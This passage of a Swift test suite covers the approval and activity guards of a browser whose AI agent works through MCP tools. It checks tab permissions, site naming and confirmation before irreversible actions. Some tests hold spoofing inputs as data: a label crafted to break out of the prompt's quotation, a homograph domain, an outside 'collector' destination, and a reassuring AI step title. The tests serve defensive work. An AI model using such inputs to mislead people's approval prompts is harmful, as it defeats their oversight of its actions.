                #expect(await Approvals.allowInteraction(.type("what the file said"), on: tabs[0], caller: panel))
                #expect(stand.asked.count == 1 && stand.asked[0].detail.contains("file:"))
                // Using the file page itself after reading it asks nothing: it is the only thing read.
                Approvals.forgetReads(caller: panel)
                Approvals.noteRead(file, caller: panel)
                #expect(await Approvals.allowInteraction(.type("x"), on: file, caller: panel, site: nil))
                #expect(stand.asked.count == 1)
                // A scheme is no site to allow for a chat.
                Approvals.noteRead(tabs[0], caller: panel)
                #expect(await Approvals.allowInteraction(.type("x"), on: file, caller: panel))
                #expect(stand.asked.last?.choices == [.deny, .once])
            }
        }

        @Test func listingTabsNamesOnlyTheSiteOfTabsTheCallerMayNotUseAndRecordsNothingForThem() async {
            let (browser, tabs) = open(["https://a.example/private-path?token=1", "https://b.example/front", "https://c.example/allowed-path"])
            defer { browser.windowClosed() }
            browser.activate(tabs[1].id)
            let caller = "mcp-list"
            Approvals.forgetReads(caller: caller)
            defer { Approvals.forgetReads(caller: caller) }
            await asking({ _ in .once }) { stand in
                #expect(await Approvals.allowTab(tabs[2], caller: caller))
                let listed = await ToolCatalog.call("list_tabs", [:], caller: caller)
                let text = listed.content.first?["text"] as? String ?? ""
                #expect(!listed.isError && text.contains("b.example/front") && text.contains("c.example/allowed-path"), "the tab in front and the one allowed are told")
                #expect(text.contains("#\(tabs[0].id)") && text.contains("a.example") && !text.contains("private-path") && !text.contains("token"), "another tab is named by its site only")
                stand.asked.removeAll()
                // The tabs that were told are read; the one that was only named is not.
                #expect(await Approvals.allowInteraction(.type("x"), on: tabs[1], caller: caller))
                #expect(stand.asked.count == 1 && stand.asked[0].detail.contains("conversation: c.example") && !stand.asked[0].detail.contains("a.example"))
                Approvals.forgetReads(caller: caller)
                Approvals.noteRead(tabs[1], caller: caller)
                _ = await ToolCatalog.call("list_tabs", [:], caller: caller)
                stand.asked.removeAll()
                #expect(await Approvals.allowInteraction(.type("x"), on: tabs[0], caller: caller))
                #expect(stand.asked.count == 1 && stand.asked[0].detail.contains("conversation: b.example") && !stand.asked[0].detail.contains("conversation: a.example"))
            }
        }

        @Test func aLowTierActionIsAskedOncePerSiteForTheChatByThePanelAndMCPClientsAndEachTimeByTheCommandLine() async {
            let (browser, tabs) = open(["https://a.example/", "https://b.example/"])
            defer { browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { for caller in [panel, "mcp-low-unit", "cli"] { Approvals.forgetReads(caller: caller) } }
            await asking({ prompt in prompt.choices.contains(.site) ? .site : .once }) { stand in
                #expect(await Approvals.allowAction(.low, "Accept all", on: tabs[0], caller: panel))
                #expect(stand.asked.count == 1 && stand.asked[0].choices == [.deny, .once, .site] && stand.asked[0].message.contains("accept cookies"))
                #expect(stand.asked[0].detail.hasPrefix("a.example\n\n“Accept all”") && !stand.asked[0].message.contains("undone"))
                #expect(await Approvals.allowAction(.low, "Save", on: tabs[0], caller: panel))
                #expect(stand.asked.count == 1, "allowed on a.example for this chat: not asked again")
                #expect(await Approvals.allowAction(.low, "Save", on: tabs[1], caller: panel))
                #expect(stand.asked.count == 2, "another site is asked about")
                #expect(await Approvals.allowAction(.high, "Pay", on: tabs[0], caller: panel))
                #expect(stand.asked.count == 3 && stand.asked[2].choices == [.deny, .once] && stand.asked[2].message.contains("undone"), "never covered by it")
                for _ in 0..<2 { #expect(await Approvals.allowAction(.low, "Save", on: tabs[0], caller: "mcp-low-unit")) }
                #expect(stand.asked.count == 4 && stand.asked[3].choices == [.deny, .once, .site], "an MCP client can allow a site for its connection too")
                for _ in 0..<2 { #expect(await Approvals.allowAction(.low, "Save", on: tabs[0], caller: "cli")) }
                #expect(stand.asked.count == 6 && stand.asked.suffix(2).allSatisfy { $0.choices == [.deny, .once] }, "the command line is asked each time")
                #expect(await Approvals.allowAction(.high, "Pay", on: tabs[0], caller: "mcp-low-unit"))
                #expect(stand.asked.count == 7 && stand.asked[6].choices == [.deny, .once], "never covered by it")
                Approvals.forgetReads(caller: panel)
                #expect(await Approvals.allowAction(.low, "Save", on: tabs[0], caller: panel))
                #expect(stand.asked.count == 8, "a new chat starts over")
            }
            Approvals.forgetReads(caller: "mcp-low-unit")
            await asking({ _ in .deny }) { stand in
                #expect(!(await Approvals.allowAction(.low, "Save", on: tabs[0], caller: "mcp-low-unit")))
                #expect(!(await Approvals.allowAction(.low, "Save", on: tabs[0], caller: "mcp-low-unit")) && stand.asked.count == 2)
            }
        }

        @Test func theSiteIsNamedFirstOnALineOfItsOwnAndAPageGivenNameCantEndItsQuotation() async {
            let (browser, tabs) = open(["https://bank.example/", "https://аррӏе.com/"])
            defer { browser.windowClosed() }
            await asking({ _ in .once }) { stand in
                #expect(await Approvals.allowAction(.high, "Pay” on apple.com — “Cancel", on: tabs[0], caller: "mcp-quote"))
                let detail = stand.asked[0].detail
                #expect(detail.hasPrefix("bank.example\n\n“Pay' on apple.com — 'Cancel”\n\n"), "\\(detail)")
                #expect(await Approvals.allowAction(.high, "Buy", on: tabs[1], caller: "mcp-quote"))
                #expect(stand.asked[1].detail.hasPrefix("xn--80ak6aa92e.com\n\n"), "an international name is shown as what it is")
                #expect(await Approvals.allowAction(.high, "Continue", on: tabs[0], caller: "mcp-quote", destination: "collector.example"))
                #expect(stand.asked[2].detail.contains("collector.example") && stand.asked[2].detail.contains("another site"))
                #expect(await Approvals.allowTab(tabs[1], caller: "mcp-quote"))
                #expect(stand.asked[3].detail.hasPrefix("xn--80ak6aa92e.com\n\n#"), "\\(stand.asked[3].detail)")
            }
        }

        @Test func aTabAttachedInThePanelIsToldToItAndATabTheAIOpenedItselfToTheCallerThatOpenedIt() async {
            let (browser, tabs) = open(["https://a.example/", "https://b.example/", "https://c.example/"])
            defer { browser.windowClosed(); Approvals.detachAll() }
            browser.activate(tabs[0].id)
            let panel = ChatStore.caller
            #expect(!Approvals.mayShow(tabs[1], caller: panel))
            Approvals.attach(tabs[1])
            #expect(Approvals.mayShow(tabs[1], caller: panel) && !Approvals.mayShow(tabs[1], caller: "mcp-attach"))
            tabs[1].url = URL(string: "https://elsewhere.example/")
            #expect(!Approvals.mayShow(tabs[1], caller: panel), "an attached tab that moved to another site is not told")
            Approvals.detachAll()
            await asking({ _ in .deny }) { stand in
                #expect(!Approvals.mayShow(tabs[2], caller: "mcp-open"))
                Approvals.allowOpened(tabs[2], at: URL(string: "https://c.example/start")!, caller: "mcp-open")
                #expect(Approvals.mayShow(tabs[2], caller: "mcp-open") && !Approvals.mayShow(tabs[2], caller: "mcp-other"))
                #expect(await Approvals.allowTab(tabs[2], caller: "mcp-open") && stand.asked.isEmpty, "the caller that opened it is not asked about it")
                tabs[2].url = URL(string: "https://redirected.example/")
                #expect(!Approvals.mayShow(tabs[2], caller: "mcp-open"), "a site it was not opened on is asked about")
            }
        }

        @Test func closingATabTheCallerMayNotUseAsksFirst() async {
            let (browser, tabs) = open(["https://a.example/", "https://b.example/", "https://c.example/"])
            defer { browser.windowClosed() }
            browser.activate(tabs[0].id)
            await asking({ _ in .deny }) { stand in
                let refused = await ToolCatalog.call("close_tab", ["tab_id": tabs[1].id], caller: "mcp-close")
                #expect(refused.isError && stand.asked.count == 1 && stand.asked[0].detail.hasPrefix("b.example\n\n"))
                #expect(browser.tabs.contains { $0.id == tabs[1].id }, "still open")
            }
            await asking({ _ in .once }) { stand in
                let closed = await ToolCatalog.call("close_tab", ["tab_id": tabs[2].id], caller: "mcp-close-2")
                let gone = !browser.tabs.contains { $0.id == tabs[2].id }
                #expect(!closed.isError && stand.asked.count == 1 && gone)
                let own = await ToolCatalog.call("close_tab", ["tab_id": tabs[0].id], caller: "mcp-close-2")
                #expect(!own.isError && stand.asked.count == 1, "the tab in front is the user's to see being closed")
            }
        }

        @Test func anAddressVisitedBeforeIsFreeOnlyIfItsSiteWasNotReadInThisChatAndTheVisitIsOlderThanTheChat() async {
            let (browser, tabs) = open(["https://old.example/page", "https://fresh.example/"])
            defer { browser.windowClosed() }
            let caller = "mcp-known"
            let old = URL(string: "https://old.example/page?a=1")!, recent = URL(string: "https://fresh.example/page?b=2")!
            Library.shared.recordVisit(url: old.absoluteString, title: "old", at: Date(timeIntervalSinceNow: -7200))
            Approvals.forgetReads(caller: caller)
            defer { Approvals.forgetReads(caller: caller) }
            Library.shared.recordVisit(url: recent.absoluteString, title: "recent", at: Date(timeIntervalSinceNow: 60))
            await asking({ _ in .once }) { stand in
                #expect(await Approvals.allowNavigation(old, caller: caller))
                #expect(stand.asked.isEmpty, "visited long before the chat, on a site it has not read")
                #expect(await Approvals.allowNavigation(recent, caller: caller))
                #expect(stand.asked.count == 1, "a visit since the chat began is not 'visited before'")
                Approvals.noteRead(tabs[0], caller: caller)
                #expect(await Approvals.allowNavigation(old, caller: caller))
                #expect(stand.asked.count == 2, "the AI read old.example in this chat: what it read could be in the address")
            }
        }

        @Test func theFrontTabsTitleAndAddressSentWithAMessageCountAsRead() async {
            let (browser, tabs) = open(["https://front.example/", "https://other.example/"])
            defer { browser.windowClosed(); Approvals.forgetReads(caller: ChatStore.caller) }
            browser.activate(tabs[0].id)
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            let chat = ChatStore()
            chat.noteAttachedRead()
            await asking({ _ in .once }) { stand in
                #expect(await Approvals.allowInteraction(.type("x"), on: tabs[1], caller: panel))
                #expect(stand.asked.count == 1 && stand.asked[0].detail.contains("conversation: front.example"))
            }
        }

        @Test func aQuestionWaitsUntilTheUserAnswersOrTheCallerIsStopped() async {
            let (browser, tabs) = open(["https://shop.example/"])
            defer { browser.windowClosed() }
            await asking({ _ in .once }) { stand in
                stand.holds = true
                // The stop of another caller leaves it alone.
                async let answer = Approvals.allowAction(.high, "Buy", on: tabs[0], caller: "mcp-hold")
                #expect(await waitUntil { stand.asked.count == 1 })
                AgentActivity.shared.cancel(caller: "mcp-someone-else")
                Approvals.release(.once)
                #expect(await answer, "released with yes by the user")
                async let stopped = Approvals.allowAction(.high, "Buy", on: tabs[0], caller: "mcp-hold")
                #expect(await waitUntil { stand.asked.count == 2 })
                AgentActivity.shared.cancel(caller: "mcp-hold")
                #expect(!(await stopped), "withdrawn as no")
                // And nothing is left waiting that a later yes could answer.
                Approvals.release(.once)
            }
        }
    }

    @MainActor @Suite
    struct ActivityTests {
        private func browser(tabs addresses: [String]) -> (Browser, [Tab]) {
            let b = Browser()
            b.focused()
            return (b, addresses.map { b.openTab(url: URL(string: $0), activate: false) })
        }

        @Test func tabsInUseByAnotherCallerAreHeldForALease() {
            let (b, tabs) = browser(tabs: ["https://used.example/", "https://unused.example/"])
            defer { b.windowClosed() }
            #expect(!AgentActivity.shared.holds(tabs[0]))
            AgentActivity.shared.use(tabs[0], caller: "mcp-test")
            #expect(AgentActivity.shared.holds(tabs[0]) && !AgentActivity.shared.holds(tabs[1]))
        }

        @Test func eachCallersUseIsItsOwn() {
            let (b, tabs) = browser(tabs: ["https://used.example/"])
            defer { b.windowClosed() }
            let panel = ChatStore.caller
            AgentActivity.shared.runStarted()
            defer { AgentActivity.shared.runEnded() }
            AgentActivity.shared.use(tabs[0], caller: "mcp-other")
            AgentActivity.shared.use(tabs[0], caller: panel)
            #expect(AgentActivity.shared.holds(tabs[0]))
            // The run ends: the panel's use ends with it, but the other caller's lease goes on.
            AgentActivity.shared.runEnded()
            #expect(AgentActivity.shared.holds(tabs[0]), "mcp-other's use wasn't taken over by the panel's")
            AgentActivity.shared.runStarted()
            #expect(AgentActivity.shared.holds(tabs[0]))
        }

        @Test func theStepIsShownInThePanelForTheChatWhileItsRunLastsOnly() {
            let chat = ChatStore.shared
            chat.step = nil
            AgentActivity.shared.step("Clicking “Sign in”", caller: ChatStore.caller)
            #expect(chat.step == nil, "no run of the panel is on")
            AgentActivity.shared.runStarted()
            defer { AgentActivity.shared.runEnded() }
            AgentActivity.shared.step("Clicking “Sign in”", caller: "mcp-9")
            #expect(chat.step == nil)
            AgentActivity.shared.step("Clicking “Sign in”", caller: ChatStore.caller)
            #expect(chat.step == "Clicking “Sign in”")
            AgentActivity.shared.step(nil, caller: ChatStore.caller)
            #expect(chat.step == nil)
            AgentActivity.shared.step("Reading github.com", caller: ChatStore.caller)
            chat.stop()
            #expect(chat.step == nil, "stopping takes the line away")
        }

        @Test func theAIsTitleComesAfterTheAppsWordsOnTheStepLineAndTheChipAndNeverInTheirPlace() {
            let chat = ChatStore()
            chat.handle(["type": "assistant", "message": ["id": "m1", "content": [
                ["type": "tool_use", "name": "mcp__changmun__click", "input": ["element_id": 4, "title": "Comparing prices"]],
                ["type": "tool_use", "name": "mcp__changmun__sign_in", "input": ["title": "Nothing to worry about"]],
                ["type": "tool_use", "name": "mcp__changmun__read_page", "input": [:]],
            ]]])
            #expect(chat.items.map(\.text) == ["Click [4]", "Sign in with saved login", "Read page"], "the app's words are the text")
            #expect(chat.items.map(\.title) == ["Comparing prices", nil, nil], "the AI's words are a second label, and not on signing in")
            // The line the panel shows while the step runs.
            AgentActivity.shared.runStarted()
            defer { AgentActivity.shared.runEnded(); ChatStore.shared.step = nil }
            ToolCatalog.$currentTitle.withValue("Comparing prices") {
                AgentActivity.shared.step("Clicking “Buy”", caller: ChatStore.caller)
                #expect(ChatStore.shared.step == "Clicking “Buy” · Comparing prices")
                AgentActivity.shared.step("Signing in to a.example", caller: ChatStore.caller, titled: false)
                #expect(ChatStore.shared.step == "Signing in to a.example", "only the app's text where the user decides on it")
            }
            // A step that asks every time takes the title off its chip too.
            chat.hideTitle("Comparing prices")
            #expect(chat.items[0].title == nil && chat.items[0].text == "Click [4]")
        }

        @Test func aDecisionToLeaveTheTitleOutThatComesBeforeTheChipStillKeepsItOut() {
            let chat = ChatStore()
            chat.hideTitle("Comparing prices")
            chat.handle(["type": "assistant", "message": ["id": "m1", "content": [
                ["type": "tool_use", "name": "mcp__changmun__click", "input": ["element_id": 4, "title": "Comparing prices"]],
                ["type": "tool_use", "name": "mcp__changmun__click", "input": ["element_id": 5, "title": "Looking around"]],
            ]]])
            #expect(chat.items.map(\.title) == [nil, "Looking around"], "the chip made after the decision has no AI title")
            #expect(chat.items.map(\.text) == ["Click [4]", "Click [5]"], "the app's words are there either way")
        }

        @Test func anActionThatAsksEveryTimeIsAnnouncedWithoutTheAIsTitle() async throws {
            AgentActivity.shared.runStarted()
            defer { AgentActivity.shared.runEnded(); ChatStore.shared.step = nil }
            let buy = ToolCatalog.Aim(frame: nil, slot: nil, args: [:], facts: IrreversibleAction.Facts(label: "Buy now", names: ["Buy now"]), secret: false, description: "", origin: "https://a.example", fingerprint: "", exact: true, host: "a.example")
            let plain = ToolCatalog.Aim(frame: nil, slot: nil, args: [:], facts: IrreversibleAction.Facts(label: "Next", names: ["Next"]), secret: false, description: "", origin: "https://a.example", fingerprint: "", exact: false, host: "a.example")
            ToolCatalog.$currentTitle.withValue("Just looking") {
                ToolCatalog.announce("Clicking “Next”", aims: [plain], caller: ChatStore.caller)
                #expect(ChatStore.shared.step == "Clicking “Next” · Just looking")
                ToolCatalog.announce("Clicking “Buy now”", aims: [buy], caller: ChatStore.caller)
                #expect(ChatStore.shared.step == "Clicking “Buy now”", "the title of a purchase is not shown")
            }
        }

        @Test func aTabTheChatUsesIsHeldOnlyWhileItsRunLasts() {
            let (b, tabs) = browser(tabs: ["https://used.example/"])
            defer { b.windowClosed() }
            let panel = ChatStore.caller
            AgentActivity.shared.use(tabs[0], caller: panel)
            #expect(!AgentActivity.shared.holds(tabs[0]), "no run is active")
            AgentActivity.shared.runStarted()
            #expect(!AgentActivity.shared.holds(tabs[0]), "used before this run began")
            AgentActivity.shared.use(tabs[0], caller: panel)
            #expect(AgentActivity.shared.holds(tabs[0]))
            AgentActivity.shared.runEnded()
            #expect(!AgentActivity.shared.holds(tabs[0]), "back to normal when the run ends")
        }

        @Test func theTabsInUseAreListedTheMostRecentlyUsedFirstAndAllKeptAwake() {
            let (b, tabs) = browser(tabs: (0..<5).map { "https://held\($0).example/" })
            defer { b.windowClosed() }
            AgentActivity.shared.runStarted()
            defer { AgentActivity.shared.runEnded() }
            for tab in tabs { AgentActivity.shared.use(tab, caller: ChatStore.caller) }
            #expect(AgentActivity.shared.held == tabs.reversed().map(\.id), "all of them, the latest first: the view that keeps them takes the first few left after the page in front")
            #expect(tabs.allSatisfy { AgentActivity.shared.holds($0) }, "all of them are kept awake")
            AgentActivity.shared.use(tabs[0], caller: ChatStore.caller)
            #expect(AgentActivity.shared.held.first == tabs[0].id && AgentActivity.shared.held.count == tabs.count)
        }

        @Test func aTabInUseIsNeitherArchivedNorPutToSleep() async throws {
            let file = FileManager.default.temporaryDirectory.appendingPathComponent("archive-\(UUID()).json")
            defer { try? FileManager.default.removeItem(at: file) }
            let archive = TabArchive(file: file)
            let b = Browser()
            defer { b.windowClosed() }
            let shown = b.openTab(url: URL(string: "https://shown.example/"))
            let used = b.openTab(url: URL(string: "https://used.example/"), activate: false)
            let idle = b.openTab(url: URL(string: "https://idle.example/"), activate: false)
            for tab in [shown, used, idle] { tab.lastShown = Date(timeIntervalSinceNow: -3 * 86400) }
            AgentActivity.shared.use(used, caller: "mcp-test-archive")
            b.archiveIdleTabs(olderThan: 86400, to: archive)
            #expect(b.tabs.map(\.id) == [shown.id, used.id])
            #expect(archive.entries.map(\.url) == ["https://idle.example/"])

            used.wake()
            let other = b.openTab(url: URL(string: "https://other.example/"), activate: false)
            other.wake()
            let last = b.openTab(url: URL(string: "https://last.example/"), activate: false)
            last.wake()
            for tab in [used, other, last] { tab.lastShown = Date(timeIntervalSinceNow: -3 * 86400) }
            b.sleepIdleTabs(olderThan: 60)
            // The tabs to put to sleep are picked as the call is made: the one in use isn't among them. Each sleeps in a
            // callback of its own, so this is looked at once the others have, and a moment longer.
            #expect(await waitUntil { other.isAsleep && last.isAsleep }, "an idle tab goes to sleep")
            #expect(!(await waitUntil(0.5) { used.isAsleep }), "the one in use stays awake")
        }

        @Test func stoppingEndsAWaitAtOnce() async throws {
            let b = Browser()
            b.focused()
            defer { b.windowClosed() }
            let tab = b.openTab(url: nil)
            let view = tab.wake()
            let window = OffscreenWindow(view)
            defer { window.close() }
            view.loadHTMLString("<p>Nothing to see</p>", baseURL: URL(string: "https://wait.test/"))
            #expect(await waitUntil { !view.isLoading && view.url != nil })
            let start = Date()
            async let result = ToolCatalog.call("wait_for", ["text": "never there", "timeout": 30], caller: "test-wait")
            // The wait has begun once the tool has marked the tab as in use.
            #expect(await waitUntil { AgentActivity.shared.holds(tab) })
            AgentActivity.shared.cancel(caller: "test-wait")
            let answer = await result
            #expect(answer.isError && (answer.content.first?["text"] as? String)?.contains("Stopped") == true)
            #expect(Date().timeIntervalSince(start) < 6)
        }

        @Test func stoppingOneCallerLeavesAnothersWaitAlone() async throws {
            let b = Browser()
            b.focused()
            defer { b.windowClosed() }
            let tab = b.openTab(url: nil)
            let view = tab.wake()
            let window = OffscreenWindow(view)
            defer { window.close() }
            view.loadHTMLString("<p>Here</p>", baseURL: URL(string: "https://wait.test/"))
            #expect(await waitUntil { !view.isLoading && view.url != nil })
            async let result = ToolCatalog.call("wait_for", ["text": "Here", "gone": true, "timeout": 2], caller: "test-wait-2")
            #expect(await waitUntil { AgentActivity.shared.holds(tab) })
            AgentActivity.shared.cancel(caller: "test-wait-1")
            let answer = await result
            #expect(answer.isError && (answer.content.first?["text"] as? String)?.contains("Timed out") == true, "the wait ran to its own end")
        }
    }
}

/// The tools run against a real page, in a view of an off-screen window.
extension SharedAgentState {
    @MainActor @Suite
    struct PageTests {
        private func page(_ html: String, host: String = "lab.test", scheme: String = "https") async throws -> (Tab, NSWindow, Browser) {
            let b = Browser()
            b.focused()
            let tab = b.openTab(url: nil)
            let view = tab.wake()
            let window = OffscreenWindow(view)
            view.loadHTMLString(html, baseURL: URL(string: "\(scheme)://\(host)/"))
            #expect(await waitUntil { !view.isLoading && view.url != nil })
            return (tab, window, b)
        }

        /// Each tab is used by a caller of its own (unless the test names one), so what one test read isn't known to another.
        private func call(_ tab: Tab, _ name: String, _ args: [String: Any] = [:], caller: String? = nil) async -> (text: String, failed: Bool) {
            // Whatever is asked is allowed, unless the test stands in for the user itself.
            let result = await Approvals.$stand.withValue(Approvals.stand ?? Approvals.Stand { _ in .once }) {
                await ToolCatalog.call(name, args.merging(["tab_id": tab.id]) { $1 }, caller: caller ?? "test-page-\(tab.id)")
            }
            return (result.content.compactMap { $0["text"] as? String }.joined(separator: "\n"), result.isError)
        }

        private func number(of line: Substring) -> Int? {
            line.firstIndex(of: "]").flatMap { Int(line[line.index(after: line.startIndex)..<$0]) }
        }

        private func id(of label: String, in read: String) -> Int? {
            read.split(separator: "\n").first { $0.contains("\"\(label)\"") }.flatMap(number)
        }

        private func id(ofKind kind: String, in read: String) -> Int? {
            read.split(separator: "\n").first { $0.contains("] \(kind) ") }.flatMap(number)
        }

        /// What the page's own scripts have to say: its title, say.
        private func evaluate(_ tab: Tab, _ script: String) async -> String {
            guard let view = tab.webView else { return "" }
            return (try? await view.callAsyncJavaScript(script, contentWorld: .page)).flatMap { "\($0)" } ?? ""
        }

        @Test func aWindowOpenedWhileAToolOtherThanAClickRunsIsNotTheUsers() async throws {
            let prefs = Preferences.shared
            let saved = prefs.popupHosts
            defer { prefs.popupHosts = saved }
            prefs.popupHosts = []
            let html = """
                <body><input placeholder="Name" oninput="window.typed = window.open('/typed') ? 'window' : 'refused'">
                <button onclick="window.clicked = window.open('/clicked') ? 'window' : 'refused'">Go</button></body>
                """
            let (tab, window, browser) = try await page(html, host: "ai.test")
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            let field = try #require(id(of: "Name", in: read)), go = try #require(id(of: "Go", in: read))
            // The tool's script carries a user gesture, but typing is not a click: the page's handler gets no window, and the bar.
            let typed = await call(tab, "type_text", ["element_id": field, "text": "hi"])
            #expect(!typed.failed, Comment(rawValue: typed.text))
            #expect(await evaluate(tab, "return window.typed") == "refused")
            #expect(browser.tabs.count == 1)
            #expect(await waitUntil { tab.blockedPopup?.absoluteString == "https://ai.test/typed" })
            // A click is what a click is, even straight after: the window it asked for opens.
            let clicked = await call(tab, "click", ["element_id": go])
            #expect(!clicked.failed, Comment(rawValue: clicked.text))
            #expect(await evaluate(tab, "return window.clicked") == "window")
            #expect(browser.tabs.count == 2)
            // On a site the user allowed, the same typing opens a window like any other of the page's own.
            prefs.popupHosts = ["ai.test"]
            let again = await call(tab, "type_text", ["element_id": field, "text": "other"])
            #expect(!again.failed, Comment(rawValue: again.text))
            #expect(await evaluate(tab, "return window.typed") == "window")
            #expect(browser.tabs.count == 3)
        }

        /// The question the guard asks before something that can't be undone, apart from the others about using a tab.
        private nonisolated static func isHigh(_ prompt: Approvals.Prompt) -> Bool { prompt.message.contains("undone") }
        private nonisolated static func isLow(_ prompt: Approvals.Prompt) -> Bool { prompt.message.contains("accept cookies") }
        private func guarded(_ stand: Approvals.Stand) -> [Approvals.Prompt] { stand.asked.filter(Self.isHigh) }
        private func consent(_ stand: Approvals.Stand) -> [Approvals.Prompt] { stand.asked.filter(Self.isLow) }
        /// The question for a control only the markup of the page calls a cookie banner's.
        private func bannerMarkup(_ stand: Approvals.Stand) -> [Approvals.Prompt] { stand.asked.filter { $0.message.contains("what the page calls a cookie banner") } }

        private static let form = """
            <body><h1>Lab</h1>
            <select id=color><option value=r>Red</option><option value=g>Green</option><option value=b>Blue</option></select>
            <input id=q placeholder="Fruit">
            <input id=pw type=password value="hunter2" placeholder="Secret">
            <button id=buy onclick="document.title='bought'">Buy now</button>
            <button id=cart onclick="document.title='carted'">Add to cart</button>
            <pre id=log></pre>
            <script>
            const log = m => document.getElementById('log').textContent += m + ';';
            document.getElementById('color').addEventListener('change', e => log('change ' + e.target.value));
            const q = document.getElementById('q');
            for (const t of ['keydown', 'keypress', 'keyup']) q.addEventListener(t, e => log(t + ':' + e.key + ':' + e.keyCode + (e.shiftKey ? ':shift' : '')));
            </script></body>
            """

        @Test func anOptionIsChosenByTextOrValueAndAMissingOneListsTheOthers() async throws {
            let (tab, window, browser) = try await page(Self.form)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            let select = try #require(id(ofKind: "select", in: read))
            #expect(read.contains("options=[Red | Green | Blue]"))
            let byText = await call(tab, "select_option", ["element_id": select, "option": "green"])
            #expect(!byText.failed && byText.text.contains("Green"))
            #expect((await call(tab, "read_page")).text.contains("selected=\"Green\""))
            #expect(!(await call(tab, "select_option", ["element_id": select, "option": "b"])).failed)
            #expect((await call(tab, "read_page")).text.contains("selected=\"Blue\""))
            let missing = await call(tab, "select_option", ["element_id": select, "option": "Purple"])
            #expect(missing.failed && missing.text.contains("Red, Green, Blue"))
            #expect((await call(tab, "read_page")).text.contains("change b"))
        }

        @Test func readPageShowsTheStatesAndValuesOfElementsButNeverASecretsValue() async throws {
            let html = """
                <body><input type=checkbox id=c1 checked aria-label="Bacon"><input type=checkbox aria-label="Cheese"><input type=radio aria-label="Small">
                <div role=switch aria-checked=true tabindex=0 aria-label="Dark mode">x</div>
                <details><summary>More</summary>text</details><details open><summary>Less</summary>text</details>
                <button disabled>Wait</button><button aria-disabled=true>Nope</button>
                <input id=name value="Ann   Lee" required aria-label="Name"><input type=email value="not an email" aria-label="Mail">
                <input type=text aria-invalid=true aria-label="Odd"><button aria-pressed=true>Bold</button><button aria-pressed=false>Italic</button><button aria-pressed=mixed>Underline</button>
                <select multiple aria-label="Toppings"><option selected>Ham</option><option>Olive</option><option selected>Pepper</option><option selected>Onion</option></select>
                <div role=tab aria-selected=true tabindex=0>Tab one</div><div role=tab aria-selected=false tabindex=0>Tab two</div>
                <div role=button aria-expanded=false tabindex=0>Menu</div><div role=button aria-expanded=true tabindex=0>Open menu</div>
                <input type=password value="hunter2" required pattern="[a-z]{20}" placeholder="Secret">
                <textarea aria-label="Notes">first
                second</textarea><input type=range value=7 aria-label="Level"><button>Plain</button>
                <script>document.getElementById('name').focus()</script></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            func line(_ needle: String) -> String { read.split(separator: "\n").first { $0.contains(needle) }.map(String.init) ?? "" }
            #expect(line("\"Bacon\"").contains("[checked]") && !line("\"Bacon\"").contains("value="))
            #expect(line("\"Cheese\"").hasSuffix("[unchecked]") && line("\"Small\"").hasSuffix("[unchecked]"))
            #expect(line("\"Dark mode\"").contains("[checked]"))
            #expect(line("\"More\"").contains("[collapsed]") && line("\"Less\"").contains("[expanded]"))
            #expect(line("\"Wait\"").contains("[disabled]") && line("\"Nope\"").contains("[disabled]"))
            #expect(line("\"Name\"").contains("value=\"Ann Lee\"") && line("\"Name\"").contains("[focused]") && line("\"Name\"").contains("[required]"), "\(line("\"Name\""))")
            #expect(line("\"Mail\"").contains("[invalid]") && line("\"Odd\"").contains("[invalid]") && !line("\"Name\"").contains("[invalid]"))
            #expect(line("\"Bold\"").contains("[pressed]") && !line("\"Italic\"").contains("[pressed]"))
            #expect(line("\"Underline\"").contains("[mixed]") && !line("\"Underline\"").contains("[pressed]"))
            #expect(line("\"Toppings\"").contains("selected=\"Ham, Pepper, Onion\""), "every chosen option of a list that takes several: \(line("\"Toppings\""))")
            #expect(line("Tab one").contains("[selected]") && !line("Tab two").contains("[selected]"))
            #expect(line("\"Menu\"").contains("[collapsed]") && line("\"Open menu\"").contains("[expanded]"))
            let secret = line("(password field)")
            #expect(secret.contains("[required]") && !secret.contains("[invalid]") && !secret.contains("hunter2") && !secret.contains("value="), "\(secret)")
            #expect(line("\"Notes\"").contains("value=\"first second\""), "a value is kept to one line")
            #expect(line("\"Level\"").contains("value=\"7\"") && line("\"Plain\"").hasSuffix("\"Plain\""))
            _ = await call(tab, "click", ["element_id": try #require(id(of: "Cheese", in: read))])
            #expect(line("\"Cheese\"").hasSuffix("[unchecked]"), "the first read is unchanged")
            #expect((await call(tab, "read_page")).text.contains("\"Cheese\" [checked]"))
        }

        /// The lines of a "What changed" section that begin with the mark.
        private func changes(_ text: String, _ mark: String) -> [String] {
            text.split(separator: "\n").filter { $0.hasPrefix(mark + " ") }.map(String.init)
        }

        @Test func anActionTellsWhatChangedAndNewElementsAreNumberedAndUsable() async throws {
            let html = """
                <body><button id=reveal onclick="const b = document.createElement('button'); b.textContent = 'Extra'; b.onclick = () => { document.title = 'extra used' }; document.body.append(b);
                  const i = document.createElement('input'); i.placeholder = 'City'; document.body.append(i); document.getElementById('temp').remove()">Reveal</button>
                <button id=temp>Temp</button><input type=checkbox aria-label="Bacon"><input id=nm placeholder="Name">
                <button id=pw onclick="document.getElementById('sec').value = 'hunter3'">Fill</button><input id=sec type=password value="hunter2" placeholder="Secret"></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            let count = read.split(separator: "\n").filter { $0.hasPrefix("[") }.count
            let reveal = try #require(id(of: "Reveal", in: read)), bacon = try #require(id(of: "Bacon", in: read)), name = try #require(id(of: "Name", in: read)), fill = try #require(id(of: "Fill", in: read))

            let revealed = await call(tab, "click", ["element_id": reveal])
            #expect(!revealed.failed && revealed.text.contains("What changed"), Comment(rawValue: revealed.text))
            let added = changes(revealed.text, "+")
            #expect(added.count == 2 && added.contains { $0.contains("button \"Extra\"") } && added.contains { $0.contains("\"City\"") }, "\(added)")
            let extra = try #require(added.first { $0.contains("\"Extra\"") }.flatMap { number(of: $0.dropFirst(2)) })
            #expect(extra > count, "numbered on after the ones read")
            #expect(changes(revealed.text, "-").count == 1 && changes(revealed.text, "-")[0].contains("button \"Temp\""))
            #expect(!revealed.text.contains("URL:") && !revealed.text.contains("Title:"))
            #expect(!(await call(tab, "click", ["element_id": extra])).failed)
